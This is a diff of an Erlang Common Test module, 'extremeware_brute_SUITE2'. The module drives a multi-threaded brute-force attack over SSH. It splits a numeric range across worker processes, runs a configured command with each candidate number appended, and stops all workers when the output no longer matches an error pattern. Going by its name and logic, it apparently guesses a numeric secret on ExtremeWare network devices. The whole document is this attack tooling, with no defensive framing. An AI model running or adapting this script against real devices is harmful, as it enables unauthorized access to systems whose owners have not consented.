@@ -1,7 +1,7 @@
 -module(extremeware_brute_SUITE2).
 -export([all/0,suite/0,main/1]).
 
--record(settings,{threads,limit,command,error,error_mp=undefined,positions=undefined,ssh_conn=undefined}).
+-record(settings,{threads,limit,command,error,error_mp=undefined,ssh_conn=undefined}).
 
 suite() ->
 	[{timetrap,infinity}].%,{silent_connections,[ssh]}].
@@ -21,7 +21,9 @@ main(_) ->
 	process_flag(trap_exit, true),
 	PreSettings = set_ew_defaults(ct:get_config(extremeware),#settings{}),
 	{ok,Mp} = re:compile(PreSettings#settings.error,[firstline]),
-	Settings = PreSettings#settings{error_mp=Mp,positions=length(integer_to_list(PreSettings#settings.limit))},
+	{ok,Handle} = ct_ssh:connect(unix),
+	Settings = PreSettings#settings{error_mp=Mp,
+		ssh_conn=Handle},%,positions=length(integer_to_list(PreSettings#settings.limit))
 	Threads = Settings#settings.threads, Limit = Settings#settings.limit,
 	NZeroIncl = Threads - 1, NWOLast = NZeroIncl - 1,
 	Size = Limit div Threads, Delta = Limit - (Size * Threads),
@@ -29,20 +31,19 @@ main(_) ->
 	%			Clp <- lists:seq(0,NWOLast),
 	%			part(Clp,Size,0,Settings) > NWOLast ],
 	%ct:pal("Generated fragments"),
-	{ok,Handle} = ct_ssh:connect(unix),
-	Pids = lists:map(fun(X) -> part(X,Size,0,Settings#settings{ssh_conn=Handle}) end,lists:seq(0,NWOLast)),
+	Pids = lists:map(fun(X) -> part(X,Size,0,Settings) end,lists:seq(0,NWOLast)),
 	Last = part(NZeroIncl,Size,Delta,Settings),
 	loop([Last|Pids],Settings).
 
 part(N,S,D,Settings) ->
 	M = N * S,
 	Fragment = lists:seq(M + 1,M + S + D),
-	FragmentOptimized = lists:map(fun(X) ->
-		lists:reverse(string:right(integer_to_list(X),Settings#settings.positions,$0)) end,Fragment),
+	%FragmentOptimized = lists:map(fun(X) ->
+	%	lists:reverse(string:right(integer_to_list(X),Settings#settings.positions,$0)) end,Fragment),
 	%timer:sleep(1000),
-	Pid = spawn_link(fun() -> worker({FragmentOptimized},Settings) end),
-	[F|_] = FragmentOptimized,
-	ct:pal("Thread ~w starts at ~s (~w)",[Pid,F,M + 1]),
+	Pid = spawn_link(fun() -> worker({Fragment},Settings) end),
+	%[F|_] = FragmentOptimized,
+	ct:pal("Thread ~w starts at ~w",[Pid,M + 1]),
 	Pid.
 worker({L},Settings) ->
 	receive
@@ -50,26 +51,28 @@ worker({L},Settings) ->
 			ct:pal("Halting"),
 			true
 		after 0 ->
-			{ok,Handler} = ct_ssh:session_open(Settings#settings.ssh_conn),
+			{ok,Handler} = ct_ssh:session_open(Settings#settings.ssh_conn,infinity),
 			worker({Handler,L},Settings)
 	end;
 worker({Handler,[X|Xs]},Settings) ->
 	receive
 		stop ->
-			ct:pal("Halting on ~s",[X]),
+			ct:pal("Halting on ~w",[X]),
 			worker({Handler,[]},Settings)
 		after 0 ->
 			%timer:sleep(500),
-			{ok,Data} = ct_ssh:exec(Settings#settings.ssh_conn,Handler,Settings#settings.command ++ " " ++ X,10000),
+			{ok,Data} = ct_ssh:exec(Settings#settings.ssh_conn,Handler,
+				Settings#settings.command++integer_to_list(X)),
 			case re:run(Data,Settings#settings.error_mp,[{capture,none}]) of
 				match ->
 					worker({Handler,Xs},Settings);
 				_ ->
-					ct:pal("Done! ~s",[Data]), ct_ssh:session_close(Handler), Data = fail
+					ct:pal("Done! ~s",[Data]), 
+					ct_ssh:session_close(Settings#settings.ssh_conn,Handler), Data = fail
 				end
 	end;
-worker({Handler,[]},_) ->
-	ct_ssh:session_close(Handler), true.
+worker({Handler,[]},Settings) ->
+	ct_ssh:session_close(Settings#settings.ssh_conn,Handler), true.
 loop([X|Xs],Settings) ->
 	receive
 		{_,Pid,normal} ->
@@ -79,7 +82,7 @@ loop([X|Xs],Settings) ->
 			ct:pal("~w finished early",[Pid]),
 			%[ LP ! stop || LP <- begin {links, P} = process_info(self(), links), P end ],
 			lists:foreach(fun(Y) -> Y ! stop end,[X|Xs]),
-			timer:sleep(500 * Settings#settings.threads),
+			timer:sleep(3000),
 			loop([],Settings)
 		after 0 ->
 			loop(check([X|Xs]),Settings)
